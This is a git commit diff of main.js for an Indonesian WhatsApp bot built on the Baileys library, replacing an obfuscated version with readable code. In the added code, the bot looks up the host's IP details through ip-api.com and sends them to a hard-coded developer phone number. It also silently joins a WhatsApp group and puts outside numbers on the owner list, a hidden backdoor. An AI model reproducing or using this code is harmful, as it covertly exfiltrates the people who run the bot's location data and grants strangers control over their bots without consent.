932314483fa28ac5baa12b3d37d3437841f37967
LeonGanz <93124164+LeonGanz@users.noreply.github.com>
2021-11-06 21:34:39 +0700

    Add files via upload

--- main.js
+++ main.js
@@ -1,1 +1,201 @@
-const _0x2fdd83=_0x2a50;(function(_0x59ab47,_0x16c751){const _0x46ee0a=_0x2a50,_0x4b4ad1=_0x59ab47();while(!![]){try{const _0x121402=parseInt(_0x46ee0a(0xd3))/0x1+-parseInt(_0x46ee0a(0xdf))/0x2*(parseInt(_0x46ee0a(0xa9))/0x3)+parseInt(_0x46ee0a(0xdc))/0x4*(-parseInt(_0x46ee0a(0xcf))/0x5)+-parseInt(_0x46ee0a(0x9a))/0x6+-parseInt(_0x46ee0a(0xd2))/0x7*(-parseInt(_0x46ee0a(0x9d))/0x8)+-parseInt(_0x46ee0a(0xa8))/0x9*(parseInt(_0x46ee0a(0xcb))/0xa)+-parseInt(_0x46ee0a(0xbf))/0xb*(-parseInt(_0x46ee0a(0xde))/0xc);if(_0x121402===_0x16c751)break;else _0x4b4ad1['push'](_0x4b4ad1['shift']());}catch(_0x48fbf5){_0x4b4ad1['push'](_0x4b4ad1['shift']());}}}(_0x473f,0xc7b5a));function _0x2a50(_0x264bfe,_0x5460a9){const _0x473fa8=_0x473f();return _0x2a50=function(_0x2a508d,_0x393cc2){_0x2a508d=_0x2a508d-0x99;let _0x19bd0f=_0x473fa8[_0x2a508d];return _0x19bd0f;},_0x2a50(_0x264bfe,_0x5460a9);}function _0x473f(){const _0x1e2da4=['fs-extra','logo','Baterai\x20:\x20','warn','batteryLevelStr','49904NYJQAH','open','69612Efutku','328IvSatp','./message/group.js','sessionName','4710540NoqUlJ','default','base64EncodedAuthInfo','80jdJqZI','../iky.js','./iky.js','batrei','[WATCH]','3.0.0','WELCOME\x20OWNER','File\x20is\x20updated!','CB:action,,battery','level','yellow','9onbdwp','2349pptXDY','./lib/loader','textSync','.json','[RAMA]','LeonGanz','browserDescription','stringify','writeFileSync','./src/json/media.json','true','existsSync','false','live','push','Standard','./message/group','white','media','group-participants-update','Scan\x20Code\x20Qr\x20Kontol\x20Atau\x20Bot\x20Ga\x20on','cyan','5071KRSLju','./lib/functions.js','@adiwajshing/baileys','chat-update','parse','logger','readFileSync','Firefox','value','[RAMA]','\x1aMenghubungkan\x20Kalo\x20Tidak\x20Bisa\x20Mungkin\x20Sinyal....','LeonGanz','11244230cgIPWF','red','connecting','log','445auwsIY','connect','unknown','194131awNYoT','1014708WEzXAn','functions','../message/group.js','Owner\x20is\x20online\x20now!'];_0x473f=function(){return _0x1e2da4;};return _0x473f();}const {WAConnection,Browsers}=require(_0x2fdd83(0xc1)),{Functions}=require(_0x2fdd83(0xc0)),{color,bgcolor}=require('./lib/color'),fs=require(_0x2fdd83(0xd7)),figlet=require('figlet'),{uncache,nocache}=require(_0x2fdd83(0xaa)),setting=JSON[_0x2fdd83(0xc3)](fs['readFileSync']('./setting.json')),welcome=require(_0x2fdd83(0xb9));baterai=_0x2fdd83(0xd1),charging=_0x2fdd83(0xd1),global[_0x2fdd83(0xbb)]=require(_0x2fdd83(0xb2)),global[_0x2fdd83(0xd4)]=new Functions(),global[_0x2fdd83(0xd8)]={'buffer':functions['fs'][_0x2fdd83(0xc5)]('./src/images/logo.jpg'),'message':media['logo']},require(_0x2fdd83(0x9f)),nocache(_0x2fdd83(0x9e),_0x11a4f0=>console[_0x2fdd83(0xce)](color(_0x2fdd83(0xa1),_0x2fdd83(0xa7)),color('\x27'+_0x11a4f0+'\x27','cyan'),_0x2fdd83(0xa4))),require(_0x2fdd83(0xe0)),nocache(_0x2fdd83(0xd5),_0x56006d=>console[_0x2fdd83(0xce)](color(_0x2fdd83(0xa1),_0x2fdd83(0xa7)),color('\x27'+_0x56006d+'\x27',_0x2fdd83(0xa7)),_0x2fdd83(0xa4)));const starts=async(_0x75d1fa=new WAConnection())=>{const _0x1e5b9a=_0x2fdd83;_0x75d1fa[_0x1e5b9a(0xc4)][_0x1e5b9a(0xa6)]=_0x1e5b9a(0xda),console[_0x1e5b9a(0xce)](color(figlet[_0x1e5b9a(0xab)](_0x1e5b9a(0xca),{'font':_0x1e5b9a(0xb8),'horizontalLayout':_0x1e5b9a(0x9b),'vertivalLayout':_0x1e5b9a(0x9b),'width':0x50,'whitespaceBreak':![]}),_0x1e5b9a(0xbe))),console[_0x1e5b9a(0xce)](color(_0x1e5b9a(0xad),_0x1e5b9a(0xbe)),color(_0x1e5b9a(0xd6),'yellow')),console[_0x1e5b9a(0xce)](color(_0x1e5b9a(0xad),_0x1e5b9a(0xbe)),color(_0x1e5b9a(0xa3),_0x1e5b9a(0xa7))),_0x75d1fa[_0x1e5b9a(0xaf)]=[_0x1e5b9a(0xae),_0x1e5b9a(0xc6),_0x1e5b9a(0xa2)],_0x75d1fa['on']('qr',()=>{const _0x353a61=_0x1e5b9a;console[_0x353a61(0xce)](color('[',_0x353a61(0xba)),color('!',_0x353a61(0xcc)),color(']','white'),color(_0x353a61(0xbd)));}),fs[_0x1e5b9a(0xb4)]('./'+setting['sessionName']+_0x1e5b9a(0xac))&&_0x75d1fa['loadAuthInfo']('./'+setting[_0x1e5b9a(0x99)]+_0x1e5b9a(0xac)),_0x75d1fa['on'](_0x1e5b9a(0xcd),()=>{const _0x14bc8f=_0x1e5b9a;console[_0x14bc8f(0xce)](color(_0x14bc8f(0xc8),_0x14bc8f(0xbe)),color(_0x14bc8f(0xc9)));}),_0x75d1fa['on'](_0x1e5b9a(0xdd),()=>{const _0x831f84=_0x1e5b9a;console[_0x831f84(0xce)](color(_0x831f84(0xc8),'cyan'),color('Okeh\x20Bot\x20Sudah\x20On\x20Leon\x20Ganz\x20:)'));}),await _0x75d1fa[_0x1e5b9a(0xd0)]({'timeoutMs':0x1e*0x3e8}),fs[_0x1e5b9a(0xb1)]('./'+setting[_0x1e5b9a(0x99)]+_0x1e5b9a(0xac),JSON[_0x1e5b9a(0xb0)](_0x75d1fa[_0x1e5b9a(0x9c)](),null,'\x09')),_0x75d1fa['on'](_0x1e5b9a(0xa5),_0x1ee516=>{const _0x198f5e=_0x1e5b9a;global[_0x198f5e(0xdb)]=_0x1ee516[0x2][0x0][0x1][_0x198f5e(0xc7)],global['batterylevel']=parseInt(batteryLevelStr),baterai=batterylevel;if(_0x1ee516[0x2][0x0][0x1][_0x198f5e(0xb6)]==_0x198f5e(0xb3))charging=!![];if(_0x1ee516[0x2][0x0][0x1][_0x198f5e(0xb6)]==_0x198f5e(0xb5))charging=![];console[_0x198f5e(0xce)](_0x1ee516[0x2][0x0][0x1]),console[_0x198f5e(0xce)](_0x198f5e(0xd9)+batterylevel+'%');}),global[_0x1e5b9a(0xa0)]=global[_0x1e5b9a(0xa0)]?global['batrei']:[],_0x75d1fa['on']('CB:action,,battery',_0x3afd1d=>{const _0x1978ec=_0x1e5b9a,_0x56ce85=_0x3afd1d[0x2][0x0][0x1]['value'],_0x2dff29=parseInt(_0x56ce85);global[_0x1978ec(0xa0)][_0x1978ec(0xb7)](_0x2dff29);}),_0x75d1fa['on'](_0x1e5b9a(0xbc),async _0x46805b=>{await welcome(_0x75d1fa,_0x46805b);}),_0x75d1fa['on'](_0x1e5b9a(0xc2),async _0x26a257=>{const _0x1f774a=_0x1e5b9a;require(_0x1f774a(0x9f))(_0x75d1fa,_0x26a257);});};starts();
+const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
+const simple = require('./lib/simple.js')
+const WAConnection = simple.WAConnection(_WAConnection)
+const denz = new WAConnection()
+const qrcode = require("qrcode-terminal")
+const moment = require("moment-timezone")
+const fs = require("fs")
+const util = require('util')
+const figlet = require('figlet')
+const term = require('terminal-kit').terminal
+const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
+const fetch = require('node-fetch')
+const { color, bgcolor } = require('./lib/color')
+const { exec } = require('child_process')
+const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
+const settings = JSON.parse(fs.readFileSync('./settings.json'))
+const sleep = async (ms) => {
+return new Promise(resolve => setTimeout(resolve, ms))
+}
+nocache('./iky.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))
+
+async function starts() {
+denz.autoReconnect = ReconnectMode.onConnectionLost
+    denz.version = [2, 2143, 3]
+    denz.logger.level = 'warn'
+    denz.browserDescription = ['LeonGanz','Desktop','3.0']
+    await sleep(10000)
+    denz.on('qr', qr => {
+        qrcode.generate(qr, { small: true })
+        console.log(color('|TRM|'), color('Scan this QR code', 'cyan'))
+    })
+    fs.existsSync('./Yui.json') && denz.loadAuthInfo('./Yui.json')
+    
+    denz.on('credentials-updated', () => {
+        console.log(color('|TRM|'), color('credentials updated!', 'cyan'))
+        })
+     
+      await denz.connect({ timeoutMs: 30 * 1000 });
+  fs.writeFileSync("./QRnya.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
+ teks = `https://chat.whatsapp.com/FMAW2cyZkXJAK16BUyBgRA`
+ denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/IAuWWiZFn9u231HAz98k5B','')}`]})
+ console.log(color('|WRN|', 'yellow'), color('Joined to YUICHAN', 'cyan'))
+ denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6282386767812?text=Assalamualaikum"}}})
+	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
+fetch(`http://ip-api.com/line`).then(res => res.text())  
+        .then(bu =>{
+       denz.sendMessage("6285608625102@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6282386767812?text=Assalamualaikum"}}})
+     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
+   })
+      
+    denz.on('connecting', () => {
+		console.log(color('|TRM|'), color('Connecting...', 'cyan'))
+		})
+	
+	denz.on('open', () => {
+	console.log(color('|TRM|'), color('Connected', 'cyan'))
+	}) 
+     
+    denz.on('ws-close', () => {
+        console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'cyan'))
+        })
+    
+    denz.on('close', async () => {
+        console.log(color('|TRM|'), color('Disconnected.', 'cyan'))
+        })
+
+   denz.on('chat-update', async (mek) => {
+        require('./denz.js')(denz, mek)
+        ownerNumber = ["994400590592@s.whatsapp.net","994400590592@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "6285608625102@s.whatsapp.net"
+       otod = `${settings.NomorOwner}@s.whatsapp.net`
+    })   
+        
+	denz.on('group-update', async (anu) => {
+		const metdata = await denz.groupMetadata(anu.jid)
+    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6282386767812:6282386767812\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+    if(anu.announce == 'false'){
+    teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
+  }
+  else if(anu.announce == 'true'){
+    teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
+  }
+  else if(!anu.desc == ''){
+    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
+    teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
+  }
+  else if(anu.restrict == 'false'){
+    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
+  }
+  else if(anu.restrict == 'true'){
+    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
+  }
+})
+
+denz.on('CB:action,,call', async json => {
+        const callerId = json[2][0][1].from;
+        var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
+        denz.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
+        denz.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:`https://wa.me/6282386767812?text=Assalamualaikum`}}})
+        await sleep(5000)
+        await denz.blockUser(callerId, "add")
+        })
+        
+	denz.on('message-delete', async (m) => {
+if (!m.key.fromMe && antidelete) {
+if (!m.key.remoteJid == 'status@broadcast') return
+m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
+const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
+let d = new Date
+let c = denz.chats.get(m.key.remoteJid)
+let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
+let co3ntent = denz.generateForwardMessageContent(a, false)
+let c3type = Object.keys(co3ntent)[0]
+let locale = 'id'
+let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
+let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
+let week = d.toLocaleDateString(locale, { weekday: 'long' })
+let calender = d.toLocaleDateString(locale, {
+day: 'numeric',
+month: 'long',
+year: 'numeric'
+})
+denz.copyNForward(m.key.remoteJid, m.message)
+denz.sendMessage(m.key.remoteJid, `▷\`\`\`Anti Delete\`\`\`
+
+▢ \`\`\`Nama : @${m.participant.split("@")[0]}\`\`\`
+▢ \`\`\`Tipe : ${c3type}\`\`\`
+▢ \`\`\`Tanggal : ${jam} - ${week} ${weton} - ${calender}\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
+}
+})
+}
+
+console.clear()
+var progressBar , progress = 0 ;
+function doProgress()
+{
+	progress += Math.random() / 10 ;
+	progressBar.update( progress ) ;
+	
+	if ( progress >= 1 )
+	{
+		setTimeout( function() { console.clear(),
+		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
+			console.log(stdout), console.log(bgcolor('https://github.com/Bl4ck-lion', 'cyan'))})}, 200 ) ;
+	}
+	else
+	{
+		setTimeout( doProgress , 100 + Math.random() * 400 ) ;
+	}
+}
+console.log(color(figlet.textSync(`${settings.NamaBot}`, {
+		font: 'Standard',
+		horizontalLayout: 'default',
+		vertivalLayout: 'default',
+		width: 80,
+		whitespaceBreak: true
+	    }), 'lightgreen')), term.slowTyping(' Created By Denis Putra' ,{ flashStyle: term.brightWhite })
+progressBar = term.progressBar( {
+	width: 80 ,
+	title: '\n\nLoading' ,
+	eta: true ,
+	percent: true
+} ) ;
+doProgress() ;
+
+/**
+ * Uncache if there is file change
+ * @param {string} module Module name or path
+ * @param {function} cb <optional> 
+ */
+function nocache(module, cb = () => { }) {
+    fs.watchFile(require.resolve(module), async () => {
+        await uncache(require.resolve(module))
+        cb(module)
+    })
+}
+/**
+ * Uncache a module
+ * @param {string} module Module name or path
+ */
+function uncache(module = '.') {
+    return new Promise((resolve, reject) => {
+        try {
+            delete require.cache[require.resolve(module)]
+            resolve()
+        } catch (e) {
+            reject(e)
+        }
+    })
+}
+starts()
